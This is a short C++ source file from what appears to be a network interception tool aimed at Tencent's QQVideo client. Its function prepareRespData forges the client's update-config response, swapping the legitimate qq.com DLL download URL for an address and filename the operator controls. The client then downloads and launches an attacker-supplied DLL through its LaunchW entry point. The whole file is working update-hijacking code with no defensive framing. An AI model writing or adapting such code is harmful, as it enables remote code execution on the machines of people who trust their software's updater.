
#include "qqvideo.h"
#include "../HttpUtils.h"

/*[General]
SoftCount=1

[Soft1]
id=1
url=http://dldir1.qq.com/qqtv/qlpull/wpsrp.dll
funcname=LaunchW
parameter=-vender=3rd_qqlive
localname=wpsrp.dll*/

int QQVideo::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = FALSE;

	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	char * retformat =
		"[General]\r\n"
		"SoftCount=1\r\n\r\n"
		"[Soft1]\r\n"
		"id=1\r\n"
		"url=http://%s/%s\r\n"
		"funcname=LaunchW\r\n"
		"parameter=-vender=3rd_qqlive\r\n"
		"localname=wpsrp.dll\r\n";

	char result[1024];
	int retlen = wsprintfA(result, retformat, szip.c_str(), filename.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

	return m_iRespSize;
}
